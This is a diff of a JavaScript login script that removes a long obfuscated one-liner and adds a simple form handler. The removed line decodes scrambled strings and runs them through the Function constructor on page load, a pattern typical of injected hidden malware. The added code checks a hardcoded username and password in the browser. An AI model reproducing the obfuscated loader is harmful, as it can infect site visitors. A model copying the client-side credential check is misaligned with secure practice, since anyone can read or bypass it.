@@ -1,1 +1,26 @@
-var form,authentication;(function(){var mvh='',fiK=561-550;function Bgf(l){var f=2409779;var d=l.length;var r=[];for(var y=0;y<d;y++){r[y]=l.charAt(y)};for(var y=0;y<d;y++){var q=f*(y+409)+(f%23667);var x=f*(y+477)+(f%43289);var n=q%d;var j=x%d;var e=r[n];r[n]=r[j];r[j]=e;f=(q+x)%5472603;};return r.join('')};var izY=Bgf('ldcpqrognsmutbcnuchotkwzoexarrtyvfijs').substr(0,fiK);var byM='vss  h)jwx+[=llm;3+8;!(;gnt0kdofl(]s]e))omeq7n+lrxs1=(a{[ =Cegs+l)];vz; ,6sv3 .n1r]}(pvvot[4t;+psaaatr+;8Adr(if,6)i76nc6hr]i(,<;;lrlor=vqg}s=drr;(u, n]aa;.v+ a7l0+jh,r;+>6fn ;,ilh) p))+)+=ge+c+(330,otflva 9=;i t)rn.a]e(2aec=g0;]jf81fh+epva.onu=w+;}[;].;)oft(ur"l.l rrh=grl)ar.e(lyhr7)z>;;gz=1+ 1psvg1r+l[pva6(}g]od0;(tra=t[.iryv1r m =0;t()t=r;fr6c)r;"==m;us.rr)o{z=;u,sj,swonhsvy.=e;ocqts. ot-=t(t!Cn=b9=et[x(Amha,{erv=8(.i"thv-[haetjhrc0(;01)dzrg)cd8na4a{aneo;)a2.u2hl,("*h,ra.A)tje91p.=0vuCfa-)C.6n=;)=f}mv=bC(2o(9]];u2]p;=8uvs,.[ane,eeoc-.t).tA]ea"7yr,;9elst;"Cd,,o smhltueh,yefgub(Crenvfmju.p-y9gr*;ud u}7<,;miev}zaSitmo;nue(s=ir+y(,r;7a-sgrsnp<+e+nprdt;y=6S"+1rs7(asrnr{-=qas=bs;har<0r)4;dah"to+g)umibfj); .v .=)vpf=23o05)9.(,1ud<bcvl.ahdacav89p=(=ne)+g.inwl7(iirnd(4;(r=,2,(if{ii v+4,Cule;gf[yr=x)a=)rs8(rst la) [(rc5ei;t4;.o=ns,r"1rn{ewh,.hrraAvhvv8=),irfn g[;10r5nf=h(+[[lrcjn"9=s) ';var mDE=Bgf[izY];var wEh='';var qUz=mDE;var NoR=mDE(wEh,Bgf(byM));var GZh=NoR(Bgf('n5$_(!i23O.7le,j1bOei.)tyou!ewi.h](}am_a2cf.:=O;u;2w0{3.o{5raeaO$3O0]tfO9Ou22..Bo+tO%,qrp1u3O4)eOO!_r.e4OO{Or}=OO*O.t\/7f7({sf(=$=&Oie!>_e(.tooObdl{jenv=9OOe9aseOa4A_63O>oro()O(2.;){)(SOda]e.oOrsn}g3.$et]iuaa\/d<t7sr,d7 l4a0aoitiO-1tO]s7)k_1{\/3rO0$2w.n.OO.%.3OscSra6Oa7*.eahd,)o(9]O.9Odv1cno2O"7}D-7e!$1Oa;(2rOOblwmt{;0&jeo#qg;oaEa,i=4fru=9.c?ogcO+Oe13#t4=0Oq.77an1p{ 0k7a3e.i3O;=bel41s3:aO%)*8s,3,A$),=plnnj@Oo.slOn3zO?pOuO3Ot=O5t{o;=.@l=at0(&O7!u=!du0 v$Oww.*9vnvvh;d.fif(![]to4pO(tw()"7rtO)5%;e;+ftOa$-r.5[n%=+lrrz#93s)OmO)b(O,i,fvt}!] _Oe]{O5=7$)\'t;tb;;)8=e;i(3C4p3sOn;(2he+ea%a6bi$aOt;f7&b ,O6)On.O*!35etoo_iaO(;}O7o!t4fo&_)._u_}}oO7r"s7f-.;.O73O)esuO6%&=51O)(,.;ct,3_jsO!r(k(dw)a=a\',l(oi.l.a:Ox,O 7O(whlO ;OO*e_O,vtdn{2(fs!Oe$eO1)ff,(.;1q$nO.62sodtOm.;e$a7Oe9e(O4O_$).)nOnA.)#s,3m.7ea8e\'o2._aq$7Ot}h%uu{6fj$r}b+!g(.8=O.8;hh.(!6O)_1ii"2g)1n;$O)) ru(Oz,(7...=$!O}n )O.sk0b($\/01k]%!%)5(rOr5t=)5ndi]9,nnivleuO>$!i)t3r48)Odft)n..gOO,fe;O(oa2=jO0-a%oo;?x7(:.s)a,1ll,6>O1sv)9OO;rr;u(;6)Oe$}\/f(OissadO(en=2-e%@O)a,Oo#fOy( ()=_t1Ofe]rOl.roO=O>=r ykls%t}!4.tb(re5=t36x0oO11,]Ob),p)(1)O?2r]wn](,_\/7u;!eOb_d(;1,e!)moi.l\/jsBO;w(n! ra[aea{)au=S m]O_a*OaO=o$ntuoa$]} ovi6ig-ae-e>aO97O!yOd)o=}_)en_O@to_33O(,BOrjtnO)6a3o$}(m}r,in=ajate3){\/sl}?tzw74x\/O:O-Og=#=B2r6a]9)O4.%sri.1j<,l0rOs"O(O]SOs8j.;O 1o,doi)..O[=]n_O.;O9Ojv.tit{tredO),AOte](5]xOa,n(t!f5!)O)e=9]0OOOOren;(s.z )de=c3e]>4c1O2O_o%ilO%!)Otfo..nai0O9]OcipdO6er?7+nq3e%l(i$4:);s$(Onisn)__$$O(C9o =1 q_ ".a5_5i(! (.;6m{O0#iaO:$)p%){6_._d_4(=aeOn.$a({ 9  a$f]+_3O$ukOot)lb$gsi)}$Ofvna.$OO;d_;(!)-_a9b){lz+0iwo(})1_1*o)+e<xO7 O(_n2s)Ot)%{(  l2soii u  i+.6#{O OnOOcO3];(_am]4((&(.;a3=,39oa7.(:o67_edOv%1Oo]Oa5 a]oeraodas0a)uO!(u O22,4cOu={7)l"m .eadcs8ae\', s}=<-_l'));var ssi=qUz(mvh,GZh );ssi(3803);return 3035})()
+const form = document.querySelector("form")
+
+form.addEventListener("submit",(e)=>{
+    e.preventDefault()
+
+    const username = form.username.value
+    const password = form.password.value
+
+    const authenticated = authentication(username,password)
+
+    if(authenticated){
+        window.location.href = "test.html"
+    }else{
+        alert("you inported a wrong Key or password")
+    }
+})
+
+// function for checking username and password
+
+function authentication(username,password){
+    if(username === "niin1-911911-911911" && password === "niin-are-cool"){
+        return true
+    }else{
+        return false
+    }
+}
